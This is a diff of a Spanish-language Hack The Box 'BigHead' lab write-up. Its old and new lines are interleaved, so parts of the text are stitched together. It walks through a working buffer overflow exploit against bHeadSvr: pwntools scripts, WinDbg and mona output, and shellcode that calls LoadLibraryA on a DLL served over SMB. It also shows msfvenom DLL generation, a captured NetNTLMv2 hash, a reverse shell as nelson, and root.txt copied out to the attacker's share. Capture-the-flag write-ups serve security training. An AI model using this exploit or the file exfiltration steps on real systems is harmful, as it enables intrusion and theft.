+<p class="plain-text">Sin embargo para que el exploit sea lo mas pequeño posible necesitariamos enviar la cadena de la ruta <code class="language-plaintext highlighter-rouge">smb</code> en el stack pero entonces nuestras instrucciones no podrian estar ahi, enviemos de nuevo el <code class="language-plaintext highlighter-rouge">poc</code> para analizar el comportamiento</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm
-
-dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
+ret </span><span class="o">=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+stack </span><span class="o">=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
 
-smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.14.10</span><span class="mi">\\</span><span class="s">kali</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
+payload</span><span class="o"> =</span><span class="p"> junk</span><span class="o"> +</span><span class="p"> ret</span><span class="o"> +</span><span class="p"> stack
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
+shell.sendline(content)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora igual que antes crearemos un <code class="language-plaintext highlighter-rouge">breakpoint</code> pero antes de hacer el <code class="language-plaintext highlighter-rouge">jmp eax</code></p>
-<a href="/hackthebox/bighead/32.png" target="_blank"><div><p><img src="/hackthebox/bighead/32.png"></p></div></a>
-
-<p class="plain-text">Como justo despues del <code class="language-plaintext highlighter-rouge">jmp eax</code> enviamos la ruta del recurso <code class="language-plaintext highlighter-rouge">smb</code> de nuestro dll malicioso este se almacenara en el <code class="language-plaintext highlighter-rouge">ESP</code> o la pila simplemente como una string</p>
-<a href="/hackthebox/bighead/33.png" target="_blank"><div><p><img src="/hackthebox/bighead/33.png"></p></div></a>
-
-<p class="plain-text">Para que esta string sea tomada como argumento para <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> tenemos que guardarlo en un registro en este caso <code class="language-plaintext highlighter-rouge">EBX</code> esto lo hacemos con <code class="language-plaintext highlighter-rouge">mov ebx, esp</code> y dejar en el <code class="language-plaintext highlighter-rouge">ESP</code> la direccion que hace referencia a <code class="language-plaintext highlighter-rouge">EBX</code> ejecutando <code class="language-plaintext highlighter-rouge">push ebx</code></p>
+<p class="plain-text">Nos aprovecharemos de que el valor de retorno de la función <code class="language-plaintext highlighter-rouge">strcpy</code> segun <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/strcpy-wcscpy-mbscpy?view=msvc-170#return-value">documentación</a> es un puntero al destino por lo que en <code class="language-plaintext highlighter-rouge">eax</code> deberiamos tener un puntero al inicio del payload, asi que podemos saltar a <code class="language-plaintext highlighter-rouge">eax</code> en lugar de <code class="language-plaintext highlighter-rouge">esp</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov ebx, esp"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
+<code><span class="ro">0:000> </span><span class="p">g
+(3e74.4288): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0117fb14 ebx=00000170 ecx=00d71728 edx=01000000 esi=0040194e edi=0040194e  
+eip=42424242 esp=0117fb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+42424242 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> db eax
+0117fb14  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0117fb24  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0117fb34  41 41 41 41 42 42 42 42-43 43 43 43 43 43 43 43  AAAABBBBCCCCCCCC
+0117fb44  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0117fb54  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0117fb64  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+0117fb74  43 43 43 43 00 00 00 00-00 00 00 00 00 00 00 00  CCCC............
+0117fb84  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span>
 </code></pre></div></div><br>
-<a href="/hackthebox/bighead/34.png" target="_blank"><div><p><img src="/hackthebox/bighead/34.png"></p></div></a>
 
-<p class="plain-text">Ya con la direccion de la ruta como argumento en el <code class="language-plaintext highlighter-rouge">ESP</code> solo nos queda mover la direccion de <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> a un registro como <code class="language-plaintext highlighter-rouge">EAX</code> y llamarlo con un <code class="language-plaintext highlighter-rouge">call eax</code></p>
+<p class="plain-text">Buscamos nuevamente un gadget pero ahora para saltar a <code class="language-plaintext highlighter-rouge">eax</code> como jmp <code class="language-plaintext highlighter-rouge">eax</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, dword ptr ds:[0x625070c8]"</span><span class="p">)
+<code><span class="ro">0:000></span><span class="p"> !py mona jmp -r eax -m bheadsvr.dll
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py jmp -r eax -m bheadsvr.dll
+
+---------- Mona command started on 2024-07-23 20:37:31 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules bheadsvr.dll
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 1 modules
+    - Querying module bHeadSvr.dll
+    - Search complete, processing results
+[+] Preparing output file 'jmp.txt'
+    - (Re)setting logfile C:\mona\jmp.txt
+[+] Writing results to C:\mona\jmp.txt
+    - Number of pointers of type 'jmp eax' : 1 
+    - Number of pointers of type 'call eax' : 6 
+[+] Results : 
+0x625012f2 |   0x625012f2 : jmp eax |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x62501026 |   0x62501026 : call eax | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x625010e8 |   0x625010e8 : call eax |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x625012b6 |   0x625012b6 : call eax |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x62501420 |   0x62501420 : call eax | asciiprint,ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x6250154f |   0x6250154f : call eax | asciiprint,ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+0x625015e2 |   0x625015e2 : call eax |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0
+    Found a total of 7 pointers</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviaremos la string de la ruta smb al <code class="language-plaintext highlighter-rouge">dll</code> en el stack por lo que nuestro payload a ejecutar es muy simple, empujamos <code class="language-plaintext highlighter-rouge">esp</code> para que ahora el primer <code class="language-plaintext highlighter-rouge">dword</code> sea un puntero a la string, luego movemos a <code class="language-plaintext highlighter-rouge">eax</code> la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> y la llamamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esp"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, [0x625070c8]"</span><span class="p">)  
 dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<a href="/hackthebox/bighead/37.png" target="_blank"><div><p><img src="/hackthebox/bighead/37.png"></p></div></a>
-
-<p class="plain-text">Nuestro exploit final seria el siguiente, guarda la referencia a nuestra ruta <code class="language-plaintext highlighter-rouge">smb</code> del dll en <code class="language-plaintext highlighter-rouge">ESP</code> como argumento y ejecuta <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> para que cargue el dll malicioso</p>
+<p class="plain-text">Nuestro exploit ahora se ve de esta forma, en el inicio del payload enviamos las instrucciones a ejecutar, rellenamos y en el retorno saltamos a ellas, pero en el stack después del retorno se encuentra la string a la <code class="language-plaintext highlighter-rouge">dll</code> en el recurso <code class="language-plaintext highlighter-rouge">smb</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm
 
 dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov ebx, esp"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, dword ptr ds:[0x625070c8]"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esp"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, [0x625070c8]"</span><span class="p">)
 dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
@@ -1095,16 +1130,88 @@ junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A
 
 jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
 
-smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.14.10</span><span class="mi">\\</span><span class="s">kali</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
+smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">192.168.233.129</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8008</span><span class="p">)
+shell.sendline(content)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos simplemente crear una <code class="language-plaintext highlighter-rouge">dll</code> maliciosa que nos ejecute una calculadora, luego la compartimos a través de un recurso smb con <code class="language-plaintext highlighter-rouge">smbserver</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/exec CMD=calc.exe -f dll -o shell.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 193 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
+
+</span><span class="ve">❯ impacket-smbserver</span><span class="p"> user . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Establecemos un breakpoint en <code class="language-plaintext highlighter-rouge">jmp eax</code>, al ejecutar el exploit llegamos ahi y vemos que en el stack se encuentra la cadena, pero al saltar a la llamada de la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> ahora en el stack no se encuentra la cadena sino un puntero a ella</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp 0x625012f2
+
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=010afb14 ebx=00000170 ecx=0074170c edx=01000000 esi=0040194e edi=0040194e  
+eip=625012f2 esp=010afb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+bHeadSvr!EssentialFunc2+0x5:
+625012f2 ffe0            jmp     eax {010afb14}
+
+</span><span class="ro">0:000></span><span class="p"> da esp
+010afb3c  "\\192.168.233.129\user\shell.dll"
+
+</span><span class="ro">0:000></span><span class="p"> pc
+eax=778c0ed0 ebx=00000170 ecx=0074170c edx=01000000 esi=0040194e edi=0040194e  
+eip=010afb1a esp=010afb38 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+010afb1a ffd0            call    eax {KERNEL32!LoadLibraryAStub (778c0ed0)}
+
+</span><span class="ro">0:000></span><span class="p"> da poi(esp)
+010afb3c  "\\192.168.233.129\user\shell.dll"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si continuamos la ejecución carga la <code class="language-plaintext highlighter-rouge">dll</code> maliciosa y abre una calculadora</p>
+<a href="/hackthebox/bighead/26.png" target="_blank"><div><p><img src="/hackthebox/bighead/26.png"></p></div></a>
+
+<p class="plain-text">Nuestro exploit final seria el siguiente, guarda la referencia a nuestra ruta <code class="language-plaintext highlighter-rouge">smb</code> del dll en <code class="language-plaintext highlighter-rouge">esp</code> como argumento y ejecuta <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> para que cargue el dll malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm
+
+dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esp"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, [0x625070c8]"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
+
+jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
+
+smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.14.10</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
 
 payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"dev.bighead.htb"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
+shell.sendline(content)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Creamos el dll malicioso con <code class="language-plaintext highlighter-rouge">msfvenom</code> para que en caso de ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">shell</code> y lo compartimos con un servidor <code class="language-plaintext highlighter-rouge">smb</code> como se indica en el exploit</p>
@@ -1117,7 +1224,7 @@ Payload size: 1786 bytes
 Final size of dll file: 9216 bytes
 Saved as: shell.dll
 
-</span><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+</span><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -1128,9 +1235,9 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Config file parsed</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Despues de unos minutos recibimos una petición en nuestro servidor <code class="language-plaintext highlighter-rouge">smb</code> del usuario nelson que carga el <code class="language-plaintext highlighter-rouge">dll</code> y al interpretarlo tambien recibimos una <code class="language-plaintext highlighter-rouge">shell</code> como este</p>
+<p class="plain-text">Al enviar el exploit recibimos una petición en nuestro servidor <code class="language-plaintext highlighter-rouge">smb</code> del usuario nelson que carga el <code class="language-plaintext highlighter-rouge">dll</code> y al interpretarlo tambien recibimos una <code class="language-plaintext highlighter-rouge">shell</code> como este</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -1144,9 +1251,9 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] User PIEDPIPER\Nelson authenticated successfully
 [*] Nelson::PIEDPIPER:aaaaaaaaaaaaaaaa:0785c9eba0cea74625b2dac1462c6203:0101000000000000009f4868d107da01a67a6675c53e3e22000000000100100047004f0072005a005100770051004b000300100047004f0072005a005100770051004b000200100079004f006e006300420058005a0067000400100079004f006e006300420058005a00670007000800009f4868d107da010600040002000000080030003000000000000000000000000020000056912fbf6f69c4c060774a884c4dafb82c032815e7ec7c56ed6a55e7ad2225d0000000000000000000000000  
 [*] Connecting Share(1:IPC$)
-[*] Connecting Share(2:kali)
+[*] Connecting Share(2:user)
 [*] Disconnecting Share(1:IPC$)
-[*] Disconnecting Share(2:kali)
+[*] Disconnecting Share(2:user)
 [*] Closing down connection (10.10.10.112,49188)
 [*] Remaining connections []</span>
 </code></pre></div></div><br>
@@ -1158,7 +1265,7 @@ Connection received on 10.10.10.112
 Microsoft Windows [Version 6.0.6002]
 Copyright (c) 2006 Microsoft Corporation. All rights reserved.  
 
-C:\nginx></span><span class="am">whoami</span><span class="p">
+C:\nginx> </span><span class="am">whoami</span><span class="p">
 piedpiper\nelson
 
 C:\nginx></span>
@@ -1535,7 +1642,7 @@ PS C:\Users\Administrator\AppData\Roaming\KeePass></span>
 
 <p class="plain-text">Para tranferirlos podemos montar un servidor <code class="language-plaintext highlighter-rouge">smb</code> y simplemente copiar los archivos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support 
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support 
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -1547,8 +1654,8 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Desktop> </span><span class="am">cp </span><span class="p">root.txt \\10.10.14.10\kali\root.txt  
-PS C:\Users\Administrator\Desktop> </span><span class="am">cp </span><span class="p">..\Pictures\admin.png \\10.10.14.10\kali\admin.png  
+<code><span class="p">PS C:\Users\Administrator\Desktop> </span><span class="am">cp </span><span class="p">root.txt \\10.10.14.10\user\root.txt  
+PS C:\Users\Administrator\Desktop> </span><span class="am">cp </span><span class="p">..\Pictures\admin.png \\10.10.14.10\user\admin.png  
 PS C:\Users\Administrator\Desktop></span>
 </code></pre></div></div><br>
 
